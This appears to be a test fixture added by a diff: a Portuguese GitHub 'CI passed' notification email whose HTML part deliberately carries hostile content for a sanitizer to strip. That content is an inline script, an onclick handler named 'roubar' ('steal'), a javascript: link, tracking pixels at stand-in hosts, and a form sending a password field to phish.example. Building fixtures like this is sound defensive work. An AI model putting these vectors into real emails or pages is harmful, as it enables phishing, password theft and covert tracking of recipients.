@@ -1,0 +1,28 @@
+Message-ID: <alt.002@github.com>
+In-Reply-To: <orig.001@acmeco.com.br>
+References: <raiz.000@acmeco.com.br> <orig.001@acmeco.com.br>
+Date: Tue, 06 Oct 2026 08:30:00 +0000
+From: "GitHub" <noreply@github.com>
+To: dev@acmeco.com.br
+Subject: Re: [acmeco/mailbox] CI passou
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="b1"
+
+--b1
+Content-Type: text/plain; charset="utf-8"
+
+CI passou em main.
+
+--b1
+Content-Type: text/html; charset="utf-8"
+
+<html><head><title>T</title><style>p{color:red}</style></head><body>
+<p onclick="roubar()">CI <b>passou</b> em <a href="https://github.com/acmeco/mailbox">main</a>.</p>
+<script>alert(1)</script>
+<img src="https://tracker.example/open.gif?u=123" width="1" height="1">
+<a href="javascript:alert(2)">clique</a>
+<form action="https://phish.example"><input name="senha"></form>
+<table width="600" style="background:#f6f8fa;background-image:url(https://t.example/bg.png)"><tr><td>rodap&eacute;</td></tr></table>
+</body></html>
+
+--b1--
